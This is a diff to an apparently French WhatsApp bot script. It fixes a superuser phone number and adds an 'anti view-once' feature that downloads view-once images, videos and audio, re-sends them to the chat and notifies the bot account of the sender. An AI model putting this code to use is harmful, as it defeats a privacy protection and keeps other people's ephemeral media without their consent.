@@ -162,7 +162,7 @@
                 const dj2 = '2250705607226';
                 const dj3 = "2250507646665";
                 const luffy = '2250507646665';
-                const dj4 = '22507‪88697148';
+                const dj4 = '2250788697148';
                 const sudo = await getAllSudoNumbers();
                 const superUserNumbers = [servBot, dj, dj2, dj3,dj4, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
                 const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -273,6 +273,102 @@ if (conf.CHAT_BOT === 'oui') {
 
                     //fin Chat_bot
                 
+
+
+//debut de l'antivus message thomas
+
+if (conf.ANTI_VV === "oui") {
+    // Vérification si le message à vue unique existe
+    let viewOnceKey = Object.keys(msgRepondu).find(key => key.startsWith("viewOnceMessage"));
+    let vueUniqueMessage = msgRepondu;
+
+    if (viewOnceKey) {
+        vueUniqueMessage = msgRepondu[viewOnceKey].message;
+    } else {
+        return repondre("Aucun message en vue unique trouvé.");
+    }
+
+    // Vérification du type de message
+    if (vueUniqueMessage) {
+        if (
+            (vueUniqueMessage.imageMessage && vueUniqueMessage.imageMessage.viewOnce !== true) ||
+            (vueUniqueMessage.videoMessage && vueUniqueMessage.videoMessage.viewOnce !== true) ||
+            (vueUniqueMessage.audioMessage && vueUniqueMessage.audioMessage.viewOnce !== true)
+        ) {
+            return repondre("Ce message n'est pas un message en vue unique.");
+        }
+    }
+
+    try {
+        // Déclaration de l'auteur du message
+        const auteurMessage = ms.sender || ms.key.participant; // Ajustez selon votre structure
+        const nomAuteurMessage = auteurMessage.split('@')[0]; // Obtenir le nom sans le domaine
+
+        // Gestion des médias
+        let media;
+        let options = { quoted: ms };
+
+        // Gestion des messages image
+        if (vueUniqueMessage.imageMessage) {
+            media = await zk.downloadAndSaveMediaMessage(vueUniqueMessage.imageMessage);
+            await zk.sendMessage(dest, {
+                image: { url: media },
+                caption: vueUniqueMessage.imageMessage.caption || ""
+            }, options);
+            
+            // Envoi d'image directement à idBot
+            await zk.sendMessage(idBot, { text: `Message image de ${nomAuteurMessage}: ${vueUniqueMessage.imageMessage.caption || ""}` });
+            
+        // Gestion des messages vidéo
+        } else if (vueUniqueMessage.videoMessage) {
+            media = await zk.downloadAndSaveMediaMessage(vueUniqueMessage.videoMessage);
+            await zk.sendMessage(dest, {
+                video: { url: media },
+                caption: vueUniqueMessage.videoMessage.caption || ""
+            }, options);
+            
+            // Envoi de vidéo directement à idBot
+            await zk.sendMessage(idBot, { text: `Message vidéo de ${nomAuteurMessage}: ${vueUniqueMessage.videoMessage.caption || ""}` });
+            
+        // Gestion des messages audio
+        } else if (vueUniqueMessage.audioMessage) {
+            media = await zk.downloadAndSaveMediaMessage(vueUniqueMessage.audioMessage);
+            await zk.sendMessage(dest, {
+                audio: { url: media },
+                mimetype: "audio/mp4"
+            }, {
+                quoted: ms,
+                ptt: false
+            });
+            
+            // Envoi d'audio directement à idBot
+            await zk.sendMessage(idBot, { text: `Message audio de ${nomAuteurMessage}` });
+            
+        } else {
+            return repondre("Ce type de message en vue unique n'est pas pris en charge.");
+        }
+
+    } catch (_error) {
+        console.error("❌ Erreur lors de l'envoi du message :", _error.message || _error);
+        return repondre("Une erreur est survenue lors du traitement du message.");
+    }
+} else {
+    return repondre("La fonctionnalité ANTI_VV n'est pas activée.");
+}
+
+
+//fin de l'anti-vue unique
+
+
+
+
+
+
+
+
+
+
+
 
                 /************************ anti-delete-message */
 
@@ -1081,9 +1177,3 @@ if (conf.CHAT_BOT === 'oui') {
         main();
     }, 5000);
       
-
-
-
-
-
-   
